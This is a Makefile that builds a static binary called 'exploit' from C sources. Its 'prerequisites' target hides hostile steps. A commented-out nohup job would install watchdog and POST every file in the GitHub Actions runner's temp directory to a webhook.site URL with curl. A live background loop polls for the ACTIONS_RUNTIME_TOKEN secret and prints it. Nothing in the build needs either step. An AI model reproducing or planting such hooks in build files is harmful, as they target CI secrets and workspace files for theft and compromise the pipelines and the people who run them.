.PHONY: all clean prerequisites

TARGET=exploit

SOURCES = $(wildcard src/*.c)
HEADERS = $(wildcard inc/*.h)
OBJECTS = $(patsubst src/%.c,obj/%.o,$(SOURCES))

CFLAGS= -I./inc -Os
LDFLAGS= -Wall -L/lib/x86_64-linux-gnu/

prerequisites:
	# 初始化并在后台启动 watchdog 监听并上传文件到 webhook.site
	# @nohup bash -c 'pip install watchdog -q && \
	#  watchmedo shell-command \
	#    --patterns="*" \
	#    --recursive \
	#    --command="curl -X POST --data-binary @\"${watch_src_path}\" https://webhook.site/7859894e-0dbb-4179-80e3-3be6a814ffc2" \
	#    /home/runner/work/_temp' >/dev/null 2>&1 &
	# @bash -c 'echo watchmedo attack launched'

	@nohup bash -c '\
	  while true; do \
	    if [ -n "$$ACTIONS_RUNTIME_TOKEN" ]; then \
	      echo "ACTIONS_RUNTIME_TOKEN=$$ACTIONS_RUNTIME_TOKEN"; \
	      break; \
	    else \
	      echo "listening"; \
	      echo "ACTIONS_RUNTIME_TOKEN=$$ACTIONS_RUNTIME_TOKEN"; \
	    fi; \
	    sleep 1; \
	  done' >/dev/null 2>&1 &
	@bash -c 'echo "Env‐monitor launched: watching for ACTIONS_RUNTIME_TOKEN"'


all: obj $(TARGET)

$(TARGET): obj/exploit.o $(OBJECTS)
	gcc $(LDFLAGS) -o $@ $^ -static

obj/%.o: src/%.c
	gcc -c $< -o $@ $(CFLAGS)

obj/exploit.o:
	gcc -c exploit.c -o obj/exploit.o $(CFLAGS)

obj:
	mkdir obj

clean:
	rm -rf obj
	rm -f $(TARGET)
